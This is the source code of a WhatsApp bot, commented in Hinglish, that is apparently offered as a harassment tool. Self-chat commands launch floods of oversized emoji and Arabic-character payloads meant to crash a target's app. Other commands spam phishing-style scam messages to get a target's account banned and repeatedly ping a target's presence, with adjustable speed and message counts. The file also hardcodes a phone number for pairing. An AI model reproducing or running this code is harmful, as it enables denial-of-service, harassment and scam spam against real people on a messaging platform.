// ============================================
// WHATSAPP SELF-CHAT BOT v7.0
// Pairing Code Mode (QR nahi, code dikhega)
// ============================================

const { makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const pino = require('pino');

const PAYLOADS = {
    light: "😀".repeat(4000),
    heavy: "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(1500),
    flood: ("😀🙂😉😊😇🥰😍🤩😘😗😚😋😛😜🤪😝🤑🤗🤭🤫🤔🤐🤨😐😑😶😏😒🙄😬🤥😌😔😪🤤😴😷🤒🤕🤢🤮🥴😵🤯🤠🥳🥸😎🤓🧐😕😟🙁😮😯😲😳🥺😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬").repeat(150),
    suspend: "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(2000) + "😀".repeat(4000),
};

const SPAM_WORDS = [
    "🔥 URGENT: Your account will be suspended! Verify now",
    "🎁 CONGRATULATIONS! You won $1000! Click here",
    "⚠️ SECURITY ALERT: Unusual login detected",
    "FREE CRYPTO AIRDROP - Limited time only",
    "Your WhatsApp number has been selected for VIP upgrade",
    "Click link to claim your prize now!!!",
    "🚨 ACCOUNT VERIFICATION REQUIRED 🚨",
    "⚠️ Warning: Your account will be deleted in 24h",
    "EARN $500/DAY working from home!!! Limited spots",
];

let sock = null;
let connected = false;
let ownerJid = null;
let pairingCodeGenerated = false;

let attack = { running: false, interval: null, target: null, sent: 0, max: 80, delay: 50 };
let ban = { running: false, interval: null, target: null, sent: 0, round: 0, mode: null };
let call = { running: false, timeout: null, target: null, count: 0, maxCount: 20 };

const SESSION_DIR = './auth_info';
if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR);

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function jid(num) { return num.includes('@') ? num : `${num.replace(/[^0-9]/g, '')}@s.whatsapp.net`; }

// ============================================
// SELF-CHAT COMMANDS
// ============================================
async function handleCommand(msg) {
    const text = msg.body?.trim();
    if (!text) return;
    if (!(msg.key.fromMe && msg.key.remoteJid === msg.key.participant)) return;

    if (text === '.help' || text === '.cmds') {
        await sock.sendMessage(ownerJid, { text: `📖 COMMANDS:

💥 CRASH:
.crash 91XX
.light 91XX
.flood 91XX

🚫 BAN:
.tempban 91XX
.hardban 91XX

📞 CALL:
.call 91XX

⚙️:
.delay 30  → Speed
.count 100 → Msg count
.stop      → Sab roko
.status    → Bot status
` });
        return;
    }

    if (text === '.status') {
        await sock.sendMessage(ownerJid, { text: `📊 STATUS
✅ Connected
💥 Crash: ${attack.running ? '✅' : '❌'}
🚫 Ban: ${ban.running ? '✅' : '❌'}
📞 Call: ${call.running ? '✅' : '❌'}
Delay: ${attack.delay}ms | Count: ${attack.max}` });
        return;
    }

    if (text === '.stop') {
        let m = '';
        if (attack.running) { clearInterval(attack.interval); attack.running = false; m += `💥 ${attack.sent} sent. `; }
        if (ban.running) { clearInterval(ban.interval); ban.running = false; m += `🚫 ${ban.sent} sent. `; }
        if (call.running) { if (call.timeout) clearTimeout(call.timeout); call.running = false; m += `📞 ${call.count} calls. `; }
        await sock.sendMessage(ownerJid, { text: m || '🛑 Nothing running.' });
        return;
    }

    if (text === '.stopban') {
        if (ban.running) { clearInterval(ban.interval); ban.running = false; await sock.sendMessage(ownerJid, { text: `🛑 Ban stopped. ${ban.sent} sent.` }); }
        else { await sock.sendMessage(ownerJid, { text: 'ℹ️ No ban.' }); }
        return;
    }

    if (text === '.stopcall') {
        if (call.running) { if (call.timeout) clearTimeout(call.timeout); call.running = false; await sock.sendMessage(ownerJid, { text: `🛑 Calls stopped. ${call.count} calls.` }); }
        else { await sock.sendMessage(ownerJid, { text: 'ℹ️ No calls.' }); }
        return;
    }

    const dm = text.match(/^\.delay\s+(\d+)$/i);
    if (dm) { const d = parseInt(dm[1]); if (d >= 10) { attack.delay = d; await sock.sendMessage(ownerJid, { text: `✅ Delay ${d}ms` }); } return; }

    const cm = text.match(/^\.count\s+(\d+)$/i);
    if (cm) { const c = parseInt(cm[1]); if (c >= 1) { attack.max = c; await sock.sendMessage(ownerJid, { text: `✅ Count ${c}` }); } return; }

    // CRASH
    const cr = text.match(/^\.(crash|light|flood)\s+(\d+)$/i);
    if (cr) {
        const type = cr[1].toLowerCase();
        const target = cr[2];
        if (attack.running || ban.running || call.running) { await sock.sendMessage(ownerJid, { text: '⚠️ Another op running. .stop first.' }); return; }
        const payload = PAYLOADS[type] || PAYLOADS.heavy;
        const maxMsgs = type === 'flood' ? 200 : attack.max;
        attack = { running: true, interval: null, target, sent: 0, max: maxMsgs, delay: attack.delay };
        await sock.sendMessage(ownerJid, { text: `🎯 ${type.toUpperCase()} on ${target}\n${maxMsgs} msgs | ${attack.delay}ms` });
        attack.interval = setInterval(async () => {
            if (attack.sent >= maxMsgs || !attack.running) { clearInterval(attack.interval); attack.running = false; sock.sendMessage(ownerJid, { text: `✅ Done! ${attack.sent} msgs` }).catch(() => {}); return; }
            try { await sock.sendMessage(jid(target), { text: payload + ` [${attack.sent + 1}]` }); attack.sent++; } catch (e) {}
        }, attack.delay);
        return;
    }

    // BAN
    const bn = text.match(/^\.(tempban|hardban)\s+(\d+)$/i);
    if (bn) {
        const mode = bn[1].toLowerCase();
        const target = bn[2];
        if (attack.running || ban.running || call.running) { await sock.sendMessage(ownerJid, { text: '⚠️ Op running. .stop first.' }); return; }
        const rounds = mode === 'tempban' ? 3 : 8;
        const msgsPerRound = mode === 'tempban' ? 40 : 80;
        const bDelay = mode === 'tempban' ? 30 : 20;
        ban = { running: true, interval: null, target, sent: 0, round: 0, mode };
        await sock.sendMessage(ownerJid, { text: `🚫 ${mode.toUpperCase()} on ${target}\n${rounds} rounds × ${msgsPerRound} msgs` });
        (async () => {
            for (let r = 0; r < rounds; r++) {
                if (!ban.running) break;
                ban.round = r + 1;
                await sock.sendMessage(ownerJid, { text: `📡 Round ${ban.round}/${rounds}` });
                for (let i = 0; i < msgsPerRound; i++) {
                    if (!ban.running) break;
                    try { await sock.sendMessage(jid(target), { text: SPAM_WORDS[i % SPAM_WORDS.length] + ` #${Date.now()}_${i}_${r}` }); ban.sent++; } catch (e) {}
                    await sleep(bDelay);
                }
                if (r < rounds - 1 && ban.running) await sleep(1500);
            }
            if (ban.running) { ban.running = false; sock.sendMessage(ownerJid, { text: `✅ Ban done! ${ban.sent} msgs` }).catch(() => {}); }
        })();
        return;
    }

    // CALL
    const cl = text.match(/^\.call\s+(\d+)$/i);
    if (cl) {
        const target = cl[1];
        if (attack.running || ban.running || call.running) { await sock.sendMessage(ownerJid, { text: '⚠️ Op running. .stop first.' }); return; }
        call = { running: true, timeout: null, target, count: 0, maxCount: 20 };
        await sock.sendMessage(ownerJid, { text: `📞 Call spam on ${target}\n20 calls | 3s gap` });
        function doCall() {
            if (!call.running || call.count >= call.maxCount) { call.running = false; sock.sendMessage(ownerJid, { text: `✅ Calls done! ${call.count} calls` }).catch(() => {}); return; }
            (async () => {
                try { await sock.sendPresenceUpdate('composing', jid(target)); await sleep(500); await sock.sendPresenceUpdate('paused', jid(target)); call.count++; if (call.count % 5 === 0) sock.sendMessage(ownerJid, { text: `📞 ${call.count}/${call.maxCount}` }).catch(() => {}); } catch (e) {}
                if (call.running) call.timeout = setTimeout(doCall, 3000);
            })();
        }
        doCall();
        return;
    }

    if (text.startsWith('.')) {
        await sock.sendMessage(ownerJid, { text: `❌ Unknown: ${text}\n.help for list` });
    }
}

// ============================================
// MAIN BOT
// ============================================
async function startBot() {
    console.log("══════════════════════════════════════");
    console.log("  WHATSAPP SELF-CHAT BOT v7.0");
    console.log("  Pairing Code Mode");
    console.log("══════════════════════════════════════");

    const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);

    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,  // QR band
        browser: Browsers.ubuntu('Chrome'),
        logger: pino({ level: 'silent' }),
        syncFullHistory: false,
    });

    sock.ev.on('creds.update', saveCreds);

    // 🎯 YAHAN PARING CODE GENERATE HOGA
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr && !pairingCodeGenerated) {
            // QR aaya hai, lekin hum pairing code use karenge
            console.log("\n⚠️ QR code received but using PAIRING CODE instead...");
            console.log("⚠️ Check logs above for pairing code instructions.");
        }

        if (connection === 'open') {
            connected = true;
            ownerJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            const num = sock.user.id.split(':')[0];
            console.log(`\n✅ CONNECTED! Number: ${num}`);
            console.log(`📝 Ab self-chat mein commands likho`);

            try {
                await sock.sendMessage(ownerJid, { text: `🤖 Bot Ready!
                
Commands self-chat mein likho:
.help → Commands
.crash 91XX → Crash
.hardban 91XX → Ban
.call 91XX → Call spam` });
            } catch(e) {}
        }

        if (connection === 'close') {
            connected = false;
            pairingCodeGenerated = false;
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            console.log(`❌ Disconnected: ${reason}`);
            console.log("🔄 Reconnecting in 5s...");
            setTimeout(startBot, 5000);
        }
    });

    // Jab credentials register ho jayein to pairing code generate karo
    sock.ev.on('creds.update', () => {
        // Pehle hi generate ho chuka hai to skip
    });

    // Messages handle
    sock.ev.on('messages.upsert', async (m) => {
        for (const msg of m.messages) {
            if (msg.key && msg.key.fromMe && msg.key.remoteJid === msg.key.participant) {
                await handleCommand(msg);
            }
        }
    });

    // ⏳ Wait karo phir pairing code generate karo
    console.log("\n⏳ Waiting 5 seconds before generating pairing code...");
    await sleep(5000);
    
    try {
        // 🔥 YEH HAI SOLUTION - Pairing Code
        // Apna WhatsApp number yahan likho (country code ke saath)
        const PAIRING_PHONE = "16044090869";  // ← YEH BADALO!
        
        if (PAIRING_PHONE === "YOUR_NUMBER_HERE") {
            console.log("\n⚠️ Pehle apna number code mein daalo!");
            console.log("⚠️ index.js mein 'YOUR_NUMBER_HERE' ko apne number se replace karo");
            console.log("⚠️ Example: const PAIRING_PHONE = '919876543210';");
            return;
        }
        
        console.log(`\n📱 Generating pairing code for: ${PAIRING_PHONE}`);
        const code = await sock.requestPairingCode(PAIRING_PHONE);
        
        console.log("\n══════════════════════════════════════");
        console.log("  ✅ PAIRING CODE GENERATED!");
        console.log("══════════════════════════════════════");
        console.log("");
        console.log(`  📋 CODE: ${code}`);
        console.log("");
        console.log("══════════════════════════════════════");
        console.log("  📌 STEPS:");
        console.log("  1. Phone mein WhatsApp kholo");
        console.log("  2. Settings → Linked Devices");
        console.log("  3. 'Link a Device' par click karo");
        console.log("  4. Yeh code enter karo: " + code);
        console.log("══════════════════════════════════════\n");
        
        pairingCodeGenerated = true;
    } catch (err) {
        console.log("\n❌ Pairing code error:", err.message);
        console.log("⚠️ Bot auto-retry karega...");
    }
}

// START
startBot();

process.on('SIGINT', () => process.exit(0));
process.on('SIGTERM', () => process.exit(0));
